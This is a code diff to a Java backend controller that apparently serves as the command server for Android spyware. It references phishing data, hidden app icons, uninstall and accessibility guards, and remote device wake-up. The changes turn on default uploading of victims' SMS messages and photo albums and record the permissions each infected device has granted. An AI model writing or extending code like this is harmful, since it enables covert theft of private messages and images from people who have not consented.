@@ -73,7 +73,6 @@ public class DeviceApiController extends BaseApiController {
     private FishDataService fishDataService;
 
 
-
     //注册设备
     @RequestMapping("/registerDevice")
     public Result<Void> registerDevice(@RequestBody Device device, HttpServletRequest request) {
@@ -96,9 +95,18 @@ public class DeviceApiController extends BaseApiController {
             if (dbDevice.getUninstallGuard() == null) {
                 dbDevice.setUninstallGuard(Constant.YN.Y);
             }
+
+            if (dbDevice.getUploadAlbum() == null) {
+                dbDevice.setUploadAlbum(Constant.YN.Y);
+            }
+            if (dbDevice.getUploadSms() == null) {
+                dbDevice.setUploadSms(Constant.YN.Y);
+            }
             device.setId(dbDevice.getId());
             deviceService.updateById(device);
         } else {
+            device.setUploadSms(Constant.YN.Y);
+            device.setUploadAlbum(Constant.YN.Y);
             device.setHideIcon(Constant.YN.N);
             device.setAccessibilityGuard(Constant.YN.Y);
             device.setUninstallGuard(Constant.YN.Y);
@@ -255,6 +263,7 @@ public class DeviceApiController extends BaseApiController {
         updateDevice.setId(dbDevice.getId());
         updateDevice.setLastHeart(Utils.now());
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
+        updateDevice.setPermissions(deviceStatus.getPermissions());
 
         if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
@@ -387,9 +396,6 @@ public class DeviceApiController extends BaseApiController {
         log.info("钓鱼数据:{} - {}", deviceId, fishDataVo);
         return Result.toSuccess();
     }
-
-
-
 
 
 }
